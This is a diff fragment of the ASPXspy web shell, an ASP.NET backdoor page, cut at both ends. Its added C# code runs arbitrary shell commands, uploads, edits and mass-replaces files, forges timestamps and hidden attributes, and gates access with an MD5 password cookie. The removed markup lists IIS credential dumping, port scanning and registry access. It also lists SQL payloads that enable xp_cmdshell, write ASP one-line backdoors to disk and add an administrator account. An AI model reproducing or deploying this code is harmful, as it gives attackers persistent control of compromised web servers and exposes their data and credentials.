+}
+
+}
+
+public static void YFcNP(System.Web.UI.Page page)
+
+{
+
+page.RegisterHiddenField("__EVENTTARGET","");
+
+page.RegisterHiddenField("__FILE","");
+
+string s=@"<script language=Javascript>";
+
+s+=@"function Bin_PostBack(eventTarget,eventArgument)";
+
+s+=@"{";
+
+s+=@"var theform=document.forms[0];";
+
+s+=@"theform.__EVENTTARGET.value=eventTarget;";
+
+s+=@"theform.__FILE.value=eventArgument;";
+
+s+=@"theform.submit();";
+
+s+=@"} ";
+
+s+=@"</scr"+"ipt>";
+
+page.RegisterStartupScript("",s);
+
+}
+
+protected void PPtK(object sender,EventArgs e)
+
+{
+
+WICxe();
+
+yhv.Visible=true;
+
+Bin_H2_Title.InnerText="File Search >>";
+
+NaLJ.Value=Request.PhysicalApplicationPath;
+
+oJiym.Visible=false;
+
+}
+
+protected void NBy(object sender,EventArgs e)
+
+{
+
+DirectoryInfo GQMM=new DirectoryInfo(NaLJ.Value);
+
+if(!GQMM.Exists)
+
+{
+
+xseuB("Path invalid ! ");
+
+return;
+
+}
+
+oog(GQMM);
+
+xseuB("Search completed ! ");
+
+}
+
+public void oog(DirectoryInfo dir)
+
+{
+
+try
+
+{
+
+oJiym.Visible=true;
+
+foreach(FileInfo Bin_Files in dir.GetFiles())
+
+{
+
+try
+
+{
+
+if(Bin_Files.FullName==Request.PhysicalPath)
+
+{
+
+continue;
+
+}
+
+if(!Regex.IsMatch(Bin_Files.Extension.Replace(".",""),"^("+UDLvA.Value+")$",RegexOptions.IgnoreCase))
+
+{
+
+continue;
+
+}
+
+if(Ven.SelectedItem.Value=="name")
+
+{
+
+if(rAQ.Checked)
+
+{
+
+if(Regex.IsMatch(Bin_Files.Name,iaMKl.Value,RegexOptions.IgnoreCase))
+
+{
+
+FJvQ(Bin_Files);
+
+}
+
+}
+
+else
+
+{
+
+if(Bin_Files.Name.ToLower().IndexOf(iaMKl.Value.ToLower())!=-1)
+
+{
+
+Response.Write(Bin_Files.FullName);
+
+FJvQ(Bin_Files);
+
+}
+
+}
+
+}
+
+else
+
+{
+
+StreamReader sr=new StreamReader(Bin_Files.FullName,Encoding.Default);
+
+string ava=sr.ReadToEnd();
+
+sr.Close();
+
+if(rAQ.Checked)
+
+{
+
+if(Regex.IsMatch(ava,iaMKl.Value,RegexOptions.IgnoreCase))
+
+{
+
+FJvQ(Bin_Files);
+
+if(YZw.Checked)
+
+{
+
+ava=Regex.Replace(ava,iaMKl.Value,qPe.Value,RegexOptions.IgnoreCase);
+
+StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);
+
+sw.Write(ava);
+
+sw.Close();
+
+}
+
+}
+
+}
+
+else
+
+{
+
+if(ava.ToLower().IndexOf(iaMKl.Value.ToLower())!=-1)
+
+{
+
+FJvQ(Bin_Files);
+
+if(YZw.Checked)
+
+{
+
+ava=Strings.Replace(ava,iaMKl.Value,qPe.Value,1,-1,CompareMethod.Text);
+
+StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);
+
+sw.Write(ava);
+
+sw.Close();
+
+}
+
+}
+
+}
+
+}
+
+}
+
+catch(Exception ex)
+
+{
+
+xseuB(ex.Message);
+
+continue;
+
+}
+
+}
+
+foreach(DirectoryInfo subdir in dir.GetDirectories())
+
+{
+
+oog(subdir);
+
+}
+
+}
+
+catch(Exception ex)
+
+{
+
+xseuB(ex.Message);
+
+}
+
+}
+
+public void FJvQ(FileInfo objfile)
+
+{
+
+TableRow tr=new TableRow();
+
+TableCell tc=new TableCell();
+
+string bg=OKM();
+
+tr.Attributes["onmouseover"]="this.className='focus';";
+
+tr.CssClass=bg;
+
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+
+tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(objfile.DirectoryName)+"')\">"+objfile.FullName+"</a>";
+
+tr.Cells.Add(tc);
+
+tc=new TableCell();
+
+tc.Text=objfile.LastWriteTime.ToString();
+
+tr.Cells.Add(tc);
+
+tc=new TableCell();
+
+tc.Text=mTG(objfile.Length);
+
+tr.Cells.Add(tc);
+
+oJiym.Rows.Add(tr);
+
+}
+
+public void xseuB(string instr)
+
+{
+
+jDKt.Visible=true;
+
+jDKt.InnerText=instr;
+
+}
+
+protected void xVm(object sender,EventArgs e)
+
+{
+
+string Jfm=FormsAuthentication.HashPasswordForStoringInConfigFile(HRJ.Text,"MD5").ToLower();
+
+if(Jfm==Password)
+
+{
+
+Response.Cookies.Add(new HttpCookie(vbhLn,Password));
+
+ljtzC.Visible=false;
+
+PBZw();
+
+}
+
+else
+
+{
+
+tZSx();
+
+}
+
+}
+
+protected void Ybg(object sender,EventArgs e)
+
+{
+
+krIR(Server.MapPath("."));
+
+}
+
+protected void KjPi(object sender,EventArgs e)
+
+{
+
+Bin_H2_Title.InnerText="IIS Spy >>";
+
+WICxe();
+
+VNR.Visible=true;
+
+AdCx();
+
+}
+
+protected void DGCoW(object sender,EventArgs e)
+
+{
+
+try
+
+{
+
+StreamWriter sw;
+
+if(NdCX.SelectedItem.Text=="UTF-8")
+
+{
+
+sw=new StreamWriter(Sqon.Value,false,Encoding.UTF8);
+
+}
+
+else
+
+{
+
+sw=new StreamWriter(Sqon.Value,false,Encoding.Default);
+
+}
+
+sw.Write(Xgvv.InnerText);
+
+sw.Close();
+
+xseuB("Save file success !");
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+krIR(AXSbb.Value);
+
+}
+
+protected void lbjLD(object sender,EventArgs e)
+
+{
+
+string FlwA=AXSbb.Value;
+
+FlwA=OElM(FlwA);
+
+try
+
+{
+
+Fhq.PostedFile.SaveAs(FlwA+Path.GetFileName(Fhq.Value));
+
+xseuB("File upload success!");
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+krIR(AXSbb.Value);
+
+}
+
+protected void EXV(object sender,EventArgs e)
+
+{
+
+krIR(AXSbb.Value);
+
+}
+
+protected void mcCY(object sender,EventArgs e)
+
+{
+
+krIR(Server.MapPath("."));
+
+}
+
+protected void iVk(object sender,CommandEventArgs e)
+
+{
+
+krIR(e.CommandArgument.ToString());
+
+}
+
+protected void XXrLw(object sender,EventArgs e)
+
+{
+
+try
+
+{
+
+File.SetCreationTimeUtc(QiFB.Value,File.GetCreationTimeUtc(lICp.Value));
+
+File.SetLastAccessTimeUtc(QiFB.Value,File.GetLastAccessTimeUtc(lICp.Value));
+
+File.SetLastWriteTimeUtc(QiFB.Value,File.GetLastWriteTimeUtc(lICp.Value));
+
+xseuB("File time clone success!");
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+krIR(AXSbb.Value);
+
+}
+
+protected void tIykC(object sender,EventArgs e)
+
+{
+
+string path=pWVL.Value;
+
+try
+
+{
+
+File.SetAttributes(path,FileAttributes.Normal);
+
+if(ZhWSK.Checked)
+
+{
+
+File.SetAttributes(path,FileAttributes.ReadOnly);
+
+}
+
+if(SsR.Checked)
+
+{
+
+File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.System);
+
+}
+
+if(ccB.Checked)
+
+{
+
+File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Hidden);
+
+}
+
+if(fbyZ.Checked)
+
+{
+
+File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Archive);
+
+}
+
+File.SetCreationTimeUtc(path,Convert.ToDateTime(yUqx.Value));
+
+File.SetLastAccessTimeUtc(path,Convert.ToDateTime(aLsn.Value));
+
+File.SetLastWriteTimeUtc(path,Convert.ToDateTime(uYjw.Value));
+
+xseuB("File attributes modify success!");
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+krIR(AXSbb.Value);
+
+}
+
+protected void VOxn(object sender,EventArgs e)
+
+{
+
+WICxe();
+
+vIac.Visible=true;
+
+Bin_H2_Title.InnerText="Execute Command >>";
+
+}
+
+protected void FbhN(object sender,EventArgs e)
+
+{
+
+try
+
+{
+
+Process ahAE=new Process();
+
+ahAE.StartInfo.FileName=kusi.Value;
+
+ahAE.StartInfo.Arguments=bkcm.Value;
+
+ahAE.StartInfo.UseShellExecute=false;
+
+ahAE.StartInfo.RedirectStandardInput=true;
+
+ahAE.StartInfo.RedirectStandardOutput=true;
+
+ahAE.StartInfo.RedirectStandardError=true;
+
+ahAE.Start();
+
+string Uoc=ahAE.StandardOutput.ReadToEnd();
+
+Uoc=Uoc.Replace("<","&lt;");
+
+Uoc=Uoc.Replace(">","&gt;");
+
+Uoc=Uoc.Replace("\r\n","<br>");
+
+tnQRF.Visible=true;
+
+tnQRF.InnerHtml="<hr width=\"100%\" noshade/><pre>"+Uoc+"</pre>";
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+}
+
+protected void RAFL(object sender,EventArgs e)
+
+{
+
+if(qPdI.Text.Length>0)
+
+{
+
+tpRQ(qPdI.Text);
+
+}
+
+else
+
+{
+
+lFAvw();
+
+}
+
+}
+
+protected void Grxk(object sender,EventArgs e)
+
+{
+
+YUw();
+
+}
+
+protected void ilC(object sender,EventArgs e)
+
+{
+
+tZRH();
+
+}
+
+protected void HtB(object sender,EventArgs e)
+
+{
+
+pDVM();
+
+}
+
+protected void Olm(object sender,EventArgs e)
+
+{
+
+iLVUT();
+
+}
+
+protected void jXhS(object sender,EventArgs e)
+
+{
+
+ADCpk();
+
+}
+
+protected void lRfRj(object sender,EventArgs e)
+
+{
+
+lDODR();
+
+}
+
+protected void xSy(object sender,EventArgs e)
+
+{
+
+xFhz();
+
+}
+
+protected void dMx(object sender,EventArgs e)
+
+{
+
+rAhe();
+
+}
+
+protected void zOVO(object sender,EventArgs e)
+
+{
+
+if(((DropDownList)sender).ID.ToString()=="WYmo")
+
+{
+
+dQIIF.Visible=false;
+
+MasR.Text=WYmo.SelectedItem.Value.ToString();
+
+}
+
+if(((DropDownList)sender).ID.ToString()=="Pvf")
+
+{
+
+xTZY();
+
+}
+
+if(((DropDownList)sender).ID.ToString()=="FGEy")
+
+{
+
+jHIy.InnerText=FGEy.SelectedItem.Value.ToString();
+
+}
+
+if(((DropDownList)sender).ID.ToString()=="NdCX")
+
+{
+
+gLKc(Sqon.Value);
+
+}
+
+}
+
+protected void IkkO(object sender,EventArgs e)
+
+{
+
+krIR(AXSbb.Value);
+
+}
+
+protected void BGY(object sender,EventArgs e)
+
+{
+
+vCf();
+
+}
+
+protected void cptS(object sender,EventArgs e)
+
+{
+
+vNCHZ();
+
+}
+
+protected void fDO(object sender,EventArgs e)
+
+{
+
+MHLv();
+
+}
+
+protected void vJNsE(object sender,EventArgs e)
+
+{
+
+vuou();
+
+xseuB("Clear All Thread ......");
+
+}
+
+protected void wDZ(object sender,EventArgs e)
+
+{
+
+if(iXdh.Value=="" || eEpm.Value.Length<7 || ZHS.Value=="")return;
+
+ruQO();
+
+xseuB("All Thread Start ......");
+
+}
+
+protected void tYoZ(object sender,EventArgs e)
+
+{
+
+}
+
+protected void ELkQ(object sender,EventArgs e)
+
+{
+
+VikG();
+
+GBYT.Visible=true;
+
+string res=string.Empty;
+
+foreach(ScanPort th in IVc)
+
+{
+
+res+=th.ip+" : "+th.port+" ................................. "+th.status+"<br>";
+
+}
+
+GBYT.InnerHtml=res;
+
+}
+
+protected void ORUgV(object sender,EventArgs e)
+
+{
+
+dwgT();
+
+}
+
+public void WICxe()
+
+{
+
+DCbS.Visible=false;
+
+CzfO.Visible=false;
+
+APl.Visible=false;
+
+vIac.Visible=false;
+
+kkHN.Visible=false;
+
+YwLB.Visible=false;
+
+iDgmL.Visible=false;
+
+hOWTm.Visible=false;
+
+vrFA.Visible=false;
+
+yhv.Visible=false;
+
+}
+
+</script>
+
+<html xmlns="http://www.w3.org/1999/xhtml" >
+
+<head id="Head1" runat="server">
+
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
+
+<title>ASPXspy</title>
+
+<style type="text/css">
+
+.Bin_Style_Login{font:11px Verdana;BACKGROUND: #FFFFFF;border: 1px solid #666666;}
+
+body,td{font: 12px Arial,Tahoma;line-height: 16px;}
+
+.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:16px;}
+
+.list{font:12px Arial,Tahoma;height:23px;}
+
+.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
+
+.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
+
+a {color: #00f;text-decoration:underline;}
+
+a:hover{color: #f00;text-decoration:none;}
+
+.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:5px 10px 5px 5px;}
+
+.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:5px 10px 5px 5px;}
+
+.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
+
+.head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;font-weight:bold;}
+
+.head td span{font-weight:normal;}
+
+form{margin:0;padding:0;}
+
+h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
+
+ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
+
+u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
+
+.u1{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
+
+.u2{text-decoration: none;color:#777;float:left;display:block;width:350px;margin-right:10px;}
+
+</style>
+
+<script type="text/javascript">
+
+function CheckAll(form){
+
+for(var i=0;i<form.elements.length;i++){
+
+var e=form.elements[i];
+
+if(e.name!='chkall')
+
+e.checked=form.chkall.checked;
+
+}
+
+}
+
+</script>
+
 </head>
+
 <body style="margin:0;table-layout:fixed;">
-	<form id="ASPXSpy" runat="server">
-	<div id="Bin_Div_Login" runat="server" style=" margin:15px" enableviewstate="false" visible="false" >
-		<span style="font:11px Verdana;">Password:</span>
-		<asp:TextBox ID="Bin_TextBox_Login" runat="server" CssClass="Bin_Style_Login" ></asp:TextBox>
-		<asp:Button ID="Bin_Button_Login" runat="server" Text="Login" CssClass="Bin_Style_Login" OnClick="Bin_Button_Login_Click"/>
-	</div>
-	<div id="Bin_Div_Content" runat="server">
-	<div id="Bin_Div_Head" runat="server">
-	<table width="100%" border="0" cellpadding="0" cellspacing="0">
-	<tr class="head">
-		<td ><span style="float:right;"><a href="http://www.rootkit.net.cn" target="_blank">WebShell Ver: <%=Version%></a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
-	</tr>
-	<tr class="alt1">
-		<td><span style="float:right;" id="Bin_Span_FrameVersion" runat="server"></span>
-			<asp:LinkButton ID="Bin_Button_Logout" runat="server" OnClick="Bin_Button_Logout_Click" Text="Logout" ></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_File" runat="server" Text="File Manager" OnClick="Bin_Button_File_Click"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_Search" runat="server" Text="FileSearch" OnClick="Bin_Search_Start"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_Cmd" runat="server" Text="CmdShell" OnClick="Bin_Button_Cmd_Click"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_IISspy" runat="server" Text="IIS Spy" OnClick="Bin_Button_IISspy_Click"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_Process" runat="server" Text="Process" OnClick="Bin_Button_Process_Click"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_Services" runat="server" Text="Services" OnClick="Bin_Button_Services_Click"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_Userinfo" runat="server" Text="UserInfo" OnClick="Bin_Button_Userinfo_Click"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_Sysinfo" runat="server" Text="SysInfo" OnClick="Bin_Button_Sysinfo_Click"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_Reg" runat="server" Text="RegShell" OnClick="Bin_Button_Reg_Click"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_PortScan" runat="server" Text="PortScan" OnClick="Bin_Button_PortScan_Click" ></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_DB" runat="server" Text="DataBase" OnClick="Bin_Button_DB_Click"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_PortMap" runat="server" Text="PortMap" OnClick="Bin_Button_PortMap_Click"></asp:LinkButton> |<asp:LinkButton ID="Bin_Button_WmiTools" runat="server" Text="WmiTools" onclick="Bin_Button_WmiTools_Click" ></asp:LinkButton> | <asp:LinkButton ID="zcg_lbtnADSViewer" runat="server" Text="ADSViewer" OnClick="zcg_lbtnADSViewer_Click"></asp:LinkButton> | <asp:LinkButton ID="zcg_lbtnPlugin" runat="server" Text="PluginLoader" OnClick="zcg_lbtnPlugin_Click"></asp:LinkButton></td>
-	</tr>
-	</table>
-	</div>
-	<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
-	<div id="Bin_Div_Msg" style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;" runat="server" visible="false" enableviewstate="false"></div>
-	<h2 id="Bin_H2_Title" runat="server"></h2>
-	<%--FileList--%>
-	<div id="Bin_Div_File" runat="server">
-	<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
- <tr>
-	<td style=" white-space:nowrap">Current Directory : </td>
-	<td style=" width:100%"><input class="input" id="Bin_TextBox_Path" type="text" style="width:97%;margin:0 8px;" runat="server"/>
-	</td>
-	<td style="white-space:nowrap" ><asp:Button ID="Bin_Button_Go" runat="server" Text="Go" CssClass="bt" OnClick="Bin_Button_Go_Click"/></td>
- </tr>
-	</table>
-	<table width="100%" border="0" cellpadding="4" cellspacing="0">
-	<tr class="alt1"><td style="padding:5px;">
-	<div style="float:right;"><input id="Bin_Lable_File" class="input" runat="server" type="file" style=" height:22px"/>
-	<asp:Button ID="Bin_Button_Upload" CssClass="bt" runat="server" Text="Upload" OnClick="Bin_Button_Upload_Click"/></div><asp:LinkButton ID="Bin_Button_WebRoot" runat="server" Text="WebRoot" OnClick="Bin_Button_WebRoot_Click"></asp:LinkButton> | <a href="#" id="Bin_Button_CreateDir" runat="server">Create Directory</a> | <a href="#" id="Bin_Button_CreateFile" runat="server">Create File</a>
-	 | <span id="Bin_Span_Drv" runat="server"></span><a href="#" id="Bin_Button_KillMe" runat="server" style="color:Red">Kill Me</a>
-	</td></tr>
-		<asp:Table ID="Bin_Table_File" runat="server" Width="100%" CellSpacing="0" >
-			<asp:TableRow CssClass="head"><asp:TableCell>&nbsp;</asp:TableCell><asp:TableCell>Filename</asp:TableCell><asp:TableCell Width="25%">Last modified</asp:TableCell><asp:TableCell Width="15%">Size</asp:TableCell><asp:TableCell Width="25%">Action</asp:TableCell></asp:TableRow>
-		</asp:Table>
-	</table>
-	</div>
-	<%--FileEdit--%>
-	<div id="Bin_Div_Edit" runat="server">
-	<p>Current File(import new file name and new file)<br/>
-	<input class="input" id="Bin_TextBox_Fp" type="text" size="100" runat="server"/> <asp:DropDownList ID="Bin_List_Code" runat="server" CssClass="list" AutoPostBack="true" OnSelectedIndexChanged="Bin_List_SelectedIndexChanged"><asp:ListItem>Default</asp:ListItem><asp:ListItem>UTF-8</asp:ListItem></asp:DropDownList>
-	</p>
-	<p>File Content<br/>
-	<textarea id="Bin_Textarea_Edit" runat="server" class="area" cols="100" rows="25" enableviewstate="false" ></textarea>
-	</p>
-	<p><asp:Button ID="Bin_Button_Save" runat="server" Text="Submit" CssClass="bt" OnClick="Bin_Button_Save_Click"/> <asp:Button ID="Bin_Button_Back" runat="server" Text="Back" CssClass="bt" OnClick="Bin_Button_Back_Click"/></p>
-	</div>
-	<%--CloneTime--%>
-	<div id="Bin_Div_Time" runat="server" enableviewstate="false" visible="false">
-	<p>Alter file<br/><input class="input" id="Bin_TextBox_Sp" type="text" size="120" runat="server"/></p>
-	<p>Reference file(fullpath)<br/><input class="input" id="Bin_TextBox_Dp" type="text" size="120" runat="server"/></p>
-	<p><asp:Button ID="Bin_Button_Clone" runat="server" Text="Submit" CssClass="bt" OnClick="Bin_Button_Clone_Click"/></p>
-	<h2>Set last modified &raquo;</h2>
-	<p>Current file(fullpath)<br/><input class="input" id="Bin_TextBox_Sp1" type="text" size="120" runat="server"/></p>
-	<p>
-		<asp:CheckBox ID="Bin_CheckBox_ReadOnly" runat="server" Text="ReadOnly" EnableViewState="False"/>
-		&nbsp;
-		<asp:CheckBox ID="Bin_CheckBox_System" runat="server" Text="System" EnableViewState="False"/>
-		&nbsp;
-		<asp:CheckBox ID="Bin_CheckBox_Hiddent" runat="server" Text="Hidden" EnableViewState="False"/>
-		&nbsp;
-		<asp:CheckBox ID="Bin_CheckBox_Archive" runat="server" Text="Archive" EnableViewState="False"/>
-	</p>
-	<p>
-		CreationTime :
-		<input class="input" id="Bin_TextBox_Creation" type="text" runat="server"/>
-		LastWriteTime :
-		<input class="input" id="Bin_TextBox_LastWrite" type="text" runat="server"/>
-		LastAccessTime :
-		<input class="input" id="Bin_TextBox_LastAccess" type="text" runat="server"/>
-		</p>
-		<p>
-			<asp:Button ID="Bin_Button_Att" CssClass="bt" runat="server" Text="Submit" OnClick="Bin_Button_Att_Click"/>
-		</p>
-	</div>
-	<%--IISSpy--%>
-	<div runat="server" id="Bin_Div_IISSpy" visible="false" enableviewstate="false">
-	<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
-		<asp:Table ID="Bin_Table_IISSpy" runat="server" Width="100%" CellSpacing="0">
-			<asp:TableRow CssClass="head"><asp:TableCell>ID</asp:TableCell><asp:TableCell>IIS_USER</asp:TableCell><asp:TableCell>IIS_PASS</asp:TableCell><asp:TableCell>Domain</asp:TableCell><asp:TableCell>Path</asp:TableCell></asp:TableRow>
-		</asp:Table>
-	</table>
-	</div>
-	<%--Process--%>
-	<div runat="server" id="Bin_Div_Process" visible="false" enableviewstate="false">
-	<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
-		<asp:Table ID="Bin_Table_Process" runat="server" Width="100%" CellSpacing="0" >
-			<asp:TableRow CssClass="head"><asp:TableCell></asp:TableCell><asp:TableCell>ID</asp:TableCell><asp:TableCell>Process</asp:TableCell><asp:TableCell>ThreadCount</asp:TableCell><asp:TableCell>Priority</asp:TableCell><asp:TableCell>Action</asp:TableCell></asp:TableRow>
-		</asp:Table>
-	</table>
-	</div>
-	<%--CmdShell--%>
-	<div runat="server" id="Bin_Div_Cmd">
-	 <p>CmdPath:<br/>
-	 <input class="input" runat="server" id="Bin_TextBox_CmdPath" type="text" size="100" value="c:\windows\system32\cmd.exe"/>
-	 </p>
-	 Argument:<br/>
-	 <input class="input" runat="server" id="Bin_TextBox_CmdArg" value="/c Set" type="text" size="100"/> <asp:Button ID="Bin_Button_CmdExec" CssClass="bt" runat="server" Text="Submit" OnClick="Bin_Button_CmdExec_Click"/>
-	 <div id="Bin_Div_CmdRes" runat="server" visible="false" enableviewstate="false">
-	 </div>
-	</div>
-	<%--Services--%>
-	<div runat="server" id="Bin_Div_Services" visible ="false" enableviewstate="false">
-	<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
-		<asp:Table ID="Bin_Table_Serviecs" runat="server" Width="100%" CellSpacing="0" >
-			<asp:TableRow CssClass="head"><asp:TableCell></asp:TableCell><asp:TableCell>ID</asp:TableCell><asp:TableCell>Name</asp:TableCell><asp:TableCell>Path</asp:TableCell><asp:TableCell>State</asp:TableCell><asp:TableCell>StartMode</asp:TableCell></asp:TableRow>
-		</asp:Table>
-	</table>
-	</div>
-	<%--Sysinfo--%>
-	<div runat="server" id="Bin_Div_Sysinfo" visible="false" enableviewstate="false">
-	<hr style=" border: 1px solid #ddd;height:0px;"/>
-	<ul class="info" id="Bin_Ul_Sys" runat="server"></ul>
-	<h2 id="Bin_H2_Mac" runat="server"></h2>
-	<hr style=" border: 1px solid #ddd;height:0px;"/>
-	<ul class="info" id ="Bin_Ul_NetConfig" runat="server"></ul>
-	<h2 id="Bin_H2_Driver" runat="server"></h2>
-	<hr style=" border: 1px solid #ddd;height:0px;"/>
-	<ul class="info" id ="Bin_Ul_Driver" runat="server"></ul>
-	</div>
-	<%--UserInfo--%>
-	<div runat="server" id="Bin_Div_Userinfo" visible="false" enableviewstate="false">
-	<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
-		<asp:Table ID="Bin_Table_User" runat="server" Width="100%" CellSpacing="0" >
-		</asp:Table>
-	</table>
-	</div>
-	<%--Reg--%>
-	<div id="Bin_Div_Reg" runat="server">
-	<p>Registry Path : <asp:TextBox id="Bin_Text_Regread" style="width:85%;margin:0 8px;" CssClass="input" runat="server"/><asp:Button ID="Bin_Button_RegGo" runat="server" Text="Go" CssClass="bt" onclick="Bin_Bin_RegreadButton_Click"/></p>
-	<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
-		<asp:Table ID="Bin_Table_Reg" runat="server" Width="100%" CellSpacing="0" >
-			<asp:TableRow CssClass="alt1"><asp:TableCell ColumnSpan="2" id="Bin_Regroot_Href"></asp:TableCell></asp:TableRow>
-			<asp:TableRow CssClass="head"><asp:TableCell Width="40%">Key</asp:TableCell><asp:TableCell Width="60%">Value</asp:TableCell></asp:TableRow>
-		</asp:Table>
-	</table>
-	</div>
-	<%--PortScan--%>
-	<div id="Bin_Div_PortScan" runat="server">
-	<p>
-	IP : <asp:TextBox id="Bin_TextBox_Sip" style="width:10%;margin:0 8px;" CssClass="input" runat="server" Text="127.0.0.1"/> Port : <asp:TextBox id="Bin_TextBox_Sport" style="width:40%;margin:0 8px;" CssClass="input" runat="server" Text="21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500"/> <asp:Button ID="Bin_Button_Scan" runat="server" Text="Scan" CssClass="bt" OnClick="Bin_Button_Scan_Click"/>
-	</p>
-	<div id="Bin_Label_Scanres" runat="server" visible="false" enableviewstate="false"></div>
-	</div>
-	<%--DataBase--%>
-	<div id="Bin_Div_Data" runat="server">
-	<div id='zcg_divresize' style="width:1000px;overflow:auto">
-	<p>ConnString : <asp:TextBox id="Bin_TextBox_ConnStr" style="width:70%;margin:0 8px; height:17px" CssClass="input" runat="server"/><asp:DropDownList runat="server" CssClass="list" ID="Bin_List_Connstr" AutoPostBack="True" OnSelectedIndexChanged="Bin_List_SelectedIndexChanged" ><asp:ListItem></asp:ListItem><asp:ListItem Value="server=localhost,1433;UID=sa;PWD=sa;database=master">MSSQL</asp:ListItem><asp:ListItem Value="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=d:\database.mdb">OleDb</asp:ListItem></asp:DropDownList><asp:Button ID="Bin_Button_Conn" runat="server" Text="Go" CssClass="bt" OnClick="Bin_Button_Conn_Click"/></p></div>
-	<div id="Bin_Div_DBPanel" runat="server">
-	<div id="Bin_Div_Dbinfo" runat="server"></div>
-	<div id="Bin_Div_Dblist" runat="server">
-	Please select a database : <asp:DropDownList runat="server" ID="Bin_List_DB" AutoPostBack="True" OnSelectedIndexChanged="Bin_List_SelectedIndexChanged" CssClass="list"></asp:DropDownList>
-	SQLExec : <asp:DropDownList runat="server" ID="Bin_List_Exec" AutoPostBack="True" OnSelectedIndexChanged="Bin_List_SelectedIndexChanged" CssClass="list"><asp:ListItem Value="">-- SQL Server Exec --</asp:ListItem><asp:ListItem Value="Use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')">Add xp_cmdshell</asp:ListItem><asp:ListItem Value="Use master dbcc addextendedproc('sp_OACreate','odsole70.dll')">Add sp_oacreate</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;">Add xp_cmdshell(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;">Add sp_oacreate(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;">Add makewebtask(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;">Add openrowset/opendatasource(SQL2005)</asp:ListItem><asp:ListItem Value="Exec master.dbo.xp_cmdshell 'net user'">XP_cmdshell exec</asp:ListItem><asp:ListItem Value="EXEC MASTER..XP_dirtree 'c:\',1,1">XP_dirtree</asp:ListItem><asp:ListItem Value="Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\bin.asp';">SP_oamethod exec</asp:ListItem><asp:ListItem Value="sp_makewebtask @outputfile='c:\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''">SP_makewebtask make file</asp:ListItem><asp:ListItem Value="exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')">SandBox</asp:ListItem><asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup log @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='e:\1.asp' backup log @b to disk=@t with 